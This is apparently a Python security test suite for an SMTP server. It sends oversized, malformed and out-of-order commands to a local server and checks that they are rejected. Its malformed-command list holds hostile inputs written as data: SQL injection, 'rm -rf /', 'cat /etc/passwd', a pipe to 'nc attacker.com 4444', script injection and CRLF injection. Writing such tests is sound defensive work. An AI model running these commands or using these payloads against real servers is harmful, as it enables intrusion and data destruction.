#!/usr/bin/env python3
"""
SMTP Command Parsing Security Test Suite
Tests for ELE-33: SMTP Command Parsing Buffer Overflow Risk

This test suite validates that the SMTP server properly handles:
- Buffer overflow attacks
- Malformed command sequences
- Memory exhaustion attacks
- Protocol state confusion attacks
- Timeout protection
- Bounds checking
"""

import socket
import time
import threading
import random
import string
import sys
from typing import List, Tuple

class SMTPCommandSecurityTester:
    def __init__(self, host='localhost', port=2525):
        self.host = host
        self.port = port
        self.test_results = []
        
    def log_test(self, test_name: str, success: bool, details: str = ""):
        """Log test results"""
        status = "✅ PASS" if success else "❌ FAIL"
        print(f"{status} {test_name}")
        if details:
            print(f"    {details}")
        self.test_results.append((test_name, success, details))
        
    def connect_smtp(self) -> socket.socket:
        """Create SMTP connection"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  # 10 second timeout
        sock.connect((self.host, self.port))
        return sock
        
    def read_response(self, sock: socket.socket) -> str:
        """Read SMTP response"""
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        return response.strip()
        
    def send_command(self, sock: socket.socket, command: str) -> str:
        """Send SMTP command and return response"""
        sock.send((command + '\r\n').encode('utf-8'))
        return self.read_response(sock)
        
    def test_buffer_overflow_attacks(self):
        """Test various buffer overflow attack vectors"""
        print("\n🔍 Testing Buffer Overflow Attacks...")
        
        # Test 1: Extremely long command line (>4KB)
        try:
            sock = self.connect_smtp()
            self.read_response(sock)  # Read greeting
            
            # Create a command longer than 4KB
            long_command = "HELO " + "A" * 5000
            response = self.send_command(sock, long_command)
            
            # Should be rejected with proper error code
            success = "500" in response or "554" in response
            self.log_test("Long command line (>4KB)", success, 
                         f"Response: {response[:100]}...")
            
            sock.close()
        except Exception as e:
            self.log_test("Long command line (>4KB)", False, f"Exception: {e}")
            
        # Test 2: Long parameters
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # Create MAIL FROM with extremely long address
            long_mail = "MAIL FROM:<" + "A" * 1000 + "@example.com>"
            response = self.send_command(sock, long_mail)
            
            success = "500" in response or "501" in response
            self.log_test("Long email address parameter", success,
                         f"Response: {response}")
            
            sock.close()
        except Exception as e:
            self.log_test("Long email address parameter", False, f"Exception: {e}")
            
        # Test 3: Multiple null bytes
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # Command with null bytes
            null_command = "HELO\x00\x00\x00example.com"
            response = self.send_command(sock, null_command)
            
            success = "500" in response or "554" in response
            self.log_test("Command with null bytes", success,
                         f"Response: {response}")
            
            sock.close()
        except Exception as e:
            self.log_test("Command with null bytes", False, f"Exception: {e}")
            
    def test_malformed_command_sequences(self):
        """Test malformed command sequences"""
        print("\n🔍 Testing Malformed Command Sequences...")
        
        malformed_commands = [
            # Empty commands
            "",
            "   ",
            "\r\n",
            "\n",
            
            # Invalid command structure
            "HELO",
            "MAIL",
            "RCPT",
            "DATA",
            
            # SQL injection attempts
            "HELO'; DROP TABLE users; --",
            "MAIL FROM:<test@example.com'; DROP TABLE users; --",
            "RCPT TO:<test@example.com' UNION SELECT * FROM users --",
            
            # Command injection attempts
            "HELO example.com; rm -rf /",
            "MAIL FROM:<test@example.com> && cat /etc/passwd",
            "RCPT TO:<test@example.com> | nc attacker.com 4444",
            
            # Script injection attempts
            "HELO <script>alert('xss')</script>",
            "MAIL FROM:<test@example.com><script>alert('xss')</script>",
            
            # Path traversal attempts
            "HELO ../../../etc/passwd",
            "MAIL FROM:<test@example.com>../../../etc/passwd",
            
            # Control characters
            "HELO\x01\x02\x03example.com",
            "MAIL FROM:<test@example.com>\x07\x08",
            
            # CRLF injection
            "HELO example.com\r\nMAIL FROM:<attacker@evil.com>",
            "MAIL FROM:<test@example.com>\r\nRCPT TO:<victim@target.com>",
        ]
        
        for i, command in enumerate(malformed_commands):
            try:
                sock = self.connect_smtp()
                self.read_response(sock)
                
                response = self.send_command(sock, command)
                
                # Should be rejected with proper error codes
                success = any(code in response for code in ["500", "501", "502", "554"])
                self.log_test(f"Malformed command {i+1}", success,
                             f"Command: {repr(command[:50])}, Response: {response}")
                
                sock.close()
            except Exception as e:
                self.log_test(f"Malformed command {i+1}", False, f"Exception: {e}")
                
    def test_memory_exhaustion_attacks(self):
        """Test memory exhaustion attack scenarios"""
        print("\n🔍 Testing Memory Exhaustion Attacks...")
        
        # Test 1: Rapid command flooding
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # Send many commands rapidly
            start_time = time.time()
            for i in range(100):
                response = self.send_command(sock, f"NOOP {i}")
                if "500" in response or "554" in response:
                    break
                    
            duration = time.time() - start_time
            success = duration < 5.0  # Should complete quickly
            self.log_test("Rapid command flooding", success,
                         f"Duration: {duration:.2f}s")
            
            sock.close()
        except Exception as e:
            self.log_test("Rapid command flooding", False, f"Exception: {e}")
            
        # Test 2: Large parameter flooding
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # Send commands with large parameters
            for i in range(10):
                large_param = "A" * 1000
                response = self.send_command(sock, f"HELO {large_param}")
                if "500" in response or "501" in response:
                    break
                    
            success = True  # If we get here without crashing
            self.log_test("Large parameter flooding", success,
                         "Server handled large parameters")
            
            sock.close()
        except Exception as e:
            self.log_test("Large parameter flooding", False, f"Exception: {e}")
            
    def test_protocol_state_confusion(self):
        """Test protocol state confusion attacks"""
        print("\n🔍 Testing Protocol State Confusion Attacks...")
        
        # Test 1: Commands in wrong order
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # Try DATA without MAIL FROM
            response = self.send_command(sock, "DATA")
            success = "503" in response  # Should get "Bad sequence of commands"
            self.log_test("DATA without MAIL FROM", success,
                         f"Response: {response}")
            
            # Try RCPT TO without MAIL FROM
            response = self.send_command(sock, "RCPT TO:<test@example.com>")
            success = "503" in response
            self.log_test("RCPT TO without MAIL FROM", success,
                         f"Response: {response}")
            
            sock.close()
        except Exception as e:
            self.log_test("Protocol state confusion", False, f"Exception: {e}")
            
        # Test 2: Multiple MAIL FROM commands
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # First MAIL FROM should succeed
            response = self.send_command(sock, "HELO example.com")
            response = self.send_command(sock, "MAIL FROM:<sender1@example.com>")
            success1 = "250" in response
            
            # Second MAIL FROM should be rejected or reset
            response = self.send_command(sock, "MAIL FROM:<sender2@example.com>")
            success2 = "250" in response or "503" in response
            
            success = success1 and success2
            self.log_test("Multiple MAIL FROM commands", success,
                         f"First: {success1}, Second: {success2}")
            
            sock.close()
        except Exception as e:
            self.log_test("Multiple MAIL FROM commands", False, f"Exception: {e}")
            
    def test_timeout_protection(self):
        """Test timeout protection"""
        print("\n🔍 Testing Timeout Protection...")
        
        # Test 1: Slow command processing simulation
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # Send a command and measure response time
            start_time = time.time()
            response = self.send_command(sock, "HELO example.com")
            duration = time.time() - start_time
            
            # Should respond within reasonable time
            success = duration < 5.0 and "250" in response
            self.log_test("Command timeout protection", success,
                         f"Duration: {duration:.2f}s, Response: {response}")
            
            sock.close()
        except Exception as e:
            self.log_test("Command timeout protection", False, f"Exception: {e}")
            
    def test_bounds_checking(self):
        """Test bounds checking and integer overflow protection"""
        print("\n🔍 Testing Bounds Checking...")
        
        # Test 1: Negative length strings (if possible)
        try:
            sock = self.connect_smtp()
            self.read_response(sock)
            
            # Test with various edge cases
            edge_cases = [
                "HELO " + "\x00" * 100,  # Many null bytes
                "MAIL FROM:<" + "A" * 10000 + "@example.com>",  # Very long address
                "RCPT TO:<" + "B" * 10000 + "@example.com>",   # Very long address
            ]
            
            all_success = True
            for i, command in enumerate(edge_cases):
                response = self.send_command(sock, command)
                success = any(code in response for code in ["500", "501", "502", "554"])
                if not success:
                    all_success = False
                    
            self.log_test("Bounds checking edge cases", all_success,
                         "All edge cases properly rejected")
            
            sock.close()
        except Exception as e:
            self.log_test("Bounds checking edge cases", False, f"Exception: {e}")
            
    def test_concurrent_attacks(self):
        """Test concurrent attack scenarios"""
        print("\n🔍 Testing Concurrent Attack Scenarios...")
        
        def attack_worker(worker_id: int, results: List[bool]):
            """Worker function for concurrent attacks"""
            try:
                sock = self.connect_smtp()
                self.read_response(sock)
                
                # Send various attack commands
                for i in range(10):
                    attack_commands = [
                        "HELO " + "A" * 1000,
                        "MAIL FROM:<" + "B" * 1000 + "@example.com>",
                        "RCPT TO:<" + "C" * 1000 + "@example.com>",
                        "HELO'; DROP TABLE users; --",
                        "MAIL FROM:<test@example.com> && cat /etc/passwd",
                    ]
                    
                    command = random.choice(attack_commands)
                    response = self.send_command(sock, command)
                    
                    # Check if properly rejected
                    if not any(code in response for code in ["500", "501", "502", "554"]):
                        results[worker_id] = False
                        break
                        
                results[worker_id] = True
                sock.close()
                
            except Exception:
                results[worker_id] = False
                
        # Run concurrent attacks
        num_workers = 5
        results = [False] * num_workers
        threads = []
        
        for i in range(num_workers):
            thread = threading.Thread(target=attack_worker, args=(i, results))
            threads.append(thread)
            thread.start()
            
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=30)
            
        # Check results
        success = all(results)
        self.log_test("Concurrent attack protection", success,
                     f"Workers: {num_workers}, Successful: {sum(results)}")
        
    def test_legitimate_commands(self):
        """Test that legitimate commands still work"""
        print("\n🔍 Testing Legitimate Commands...")
        
        try:
            sock = self.connect_smtp()
            
            # Test basic SMTP flow
            response = self.read_response(sock)
            success1 = "220" in response
            
            response = self.send_command(sock, "HELO example.com")
            success2 = "250" in response
            
            response = self.send_command(sock, "MAIL FROM:<sender@example.com>")
            success3 = "250" in response
            
            response = self.send_command(sock, "RCPT TO:<recipient@example.com>")
            success4 = "250" in response
            
            response = self.send_command(sock, "DATA")
            success5 = "354" in response
            
            # Send message data
            sock.send(b"Subject: Test\r\n\r\nTest message\r\n.\r\n")
            response = self.read_response(sock)
            success6 = "250" in response
            
            response = self.send_command(sock, "QUIT")
            success7 = "221" in response
            
            sock.close()
            
            all_success = all([success1, success2, success3, success4, success5, success6, success7])
            self.log_test("Legitimate SMTP flow", all_success,
                         f"Steps: {sum([success1, success2, success3, success4, success5, success6, success7])}/7")
            
        except Exception as e:
            self.log_test("Legitimate SMTP flow", False, f"Exception: {e}")
            
    def run_all_tests(self):
        """Run all security tests"""
        print("🚀 Starting SMTP Command Parsing Security Tests...")
        print("=" * 60)
        
        self.test_buffer_overflow_attacks()
        self.test_malformed_command_sequences()
        self.test_memory_exhaustion_attacks()
        self.test_protocol_state_confusion()
        self.test_timeout_protection()
        self.test_bounds_checking()
        self.test_concurrent_attacks()
        self.test_legitimate_commands()
        
        # Summary
        print("\n" + "=" * 60)
        print("📊 Test Summary:")
        
        passed = sum(1 for _, success, _ in self.test_results if success)
        total = len(self.test_results)
        
        print(f"Total Tests: {total}")
        print(f"Passed: {passed}")
        print(f"Failed: {total - passed}")
        print(f"Success Rate: {(passed/total)*100:.1f}%")
        
        if passed == total:
            print("\n🎉 All security tests passed! SMTP server is secure against command parsing attacks.")
        else:
            print(f"\n⚠️  {total - passed} security tests failed. Review the results above.")
            
        return passed == total

def main():
    """Main test function"""
    if len(sys.argv) > 1:
        host = sys.argv[1]
    else:
        host = 'localhost'
        
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    else:
        port = 2525
        
    print(f"Testing SMTP server at {host}:{port}")
    
    tester = SMTPCommandSecurityTester(host, port)
    success = tester.run_all_tests()
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
